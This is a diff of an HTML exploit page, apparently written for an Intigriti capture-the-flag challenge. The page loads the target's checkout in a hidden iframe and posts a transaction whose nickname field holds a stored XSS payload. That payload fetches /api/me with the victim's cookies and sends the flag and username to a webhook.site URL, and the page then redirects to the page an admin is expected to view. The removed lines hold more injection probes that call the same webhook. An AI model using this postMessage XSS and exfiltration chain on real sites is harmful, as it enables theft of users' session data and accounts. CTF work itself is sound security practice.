@@ -1,47 +1,72 @@
 <!DOCTYPE html>
 <html>
-<head><title>FINAL</title></head>
+<head><title>Final Exploit</title></head>
 <body>
 <div id="log"></div>
+
 <script>
 const T = 'https://challenge-0126.intigriti.io';
-const W = 'https://webhook.site/247d45dd-5ceb-4726-b948-49b69a259138';
+const W = 'https://webhook.site/b523585f-80b2-41ec-bf1a-6bedadbbf891';
 const WALLET = '1f9c3f0d5ebe9960d50b5e030572d264df';
-let s = 0;
 
-function log(m) { s++; document.getElementById('log').innerHTML += '<div>['+s+'] '+m+'</div>'; new Image().src = W+'/?step='+s+'&msg='+encodeURIComponent(m); }
+let step = 0;
+
+function log(msg) {
+    step++;
+    const ts = new Date().toISOString();
+    document.getElementById('log').innerHTML += '<div>['+step+'] '+msg+' <small>('+ts+')</small></div>';
+    console.log('['+step+']', msg);
+    new Image().src = W+'/?s='+step+'&m='+encodeURIComponent(msg)+'&ts='+Date.now();
+}
 
 async function exploit() {
-    log('STARTING');
+    log('STARTING EXPLOIT');
 
+    // Load checkout in iframe
     const iframe = document.createElement('iframe');
     iframe.style.display = 'none';
-    iframe.src = T + '/checkout.html?currency=1337COIN&price=0';
+    iframe.src = T + '/checkout.html?currency=1337COIN&price=1';
     document.body.appendChild(iframe);
 
     await new Promise(r => iframe.onload = r);
     await new Promise(r => setTimeout(r, 3000));
-    log('Checkout loaded');
+    log('Checkout iframe loaded');
 
-    // Try adding nickname field to postMessage
-    log('Sending with nickname field...');
+    // XSS Payload: Steal flag and exfiltrate to webhook
+    const xssPayload = `<img src=x onerror="
+        fetch('${T}/api/me',{credentials:'include'})
+        .then(r=>r.json())
+        .then(d=>{
+            const flag=d.flag||'NO_FLAG';
+            const user=d.username||'unknown';
+            fetch('${W}/?FLAG='+encodeURIComponent(flag)+'&USER='+encodeURIComponent(user),{mode:'no-cors'});
+            document.body.innerHTML='<h1 style=background:red;color:white;padding:20px>FLAG: '+flag+'</h1>';
+        })
+    ">`;
+
+    log('Sending transaction with XSS payload in nickname...');
+
+    // Send transaction with XSS in nickname field
     iframe.contentWindow.postMessage({
         type: 'submitTransaction',
         transaction: {
             toAddress: WALLET,
             currency: '1337COIN',
             amount: 1,
-            nickname: '<img src=x onerror="fetch(\''+W+'/?nickname_xss=1\',{mode:\'no-cors\'})">',
-            fromAddress: `');fetch('${W}/?from_xss=1',{mode:'no-cors'});//`,
-            memo: `<script>fetch('${W+'/?memo_xss=1'}',{mode:'no-cors'})<\/script>`,
-            note: '\';alert(1);//'
+            nickname: xssPayload
         }
     }, '*');
-    log('Sent');
+
+    log('postMessage sent');
 
     await new Promise(r => setTimeout(r, 3000));
-    log('Redirecting to marketwatch...');
-    window.location.href = T + '/marketwatch.html';
+    log('Waiting for admin to view MarketWatch...');
+
+    // Redirect to marketwatch where XSS will execute
+    log('Redirecting to MarketWatch...');
+    setTimeout(() => {
+        window.location.href = T + '/marketwatch.html';
+    }, 3000);
 }
 
 setTimeout(exploit, 1000);
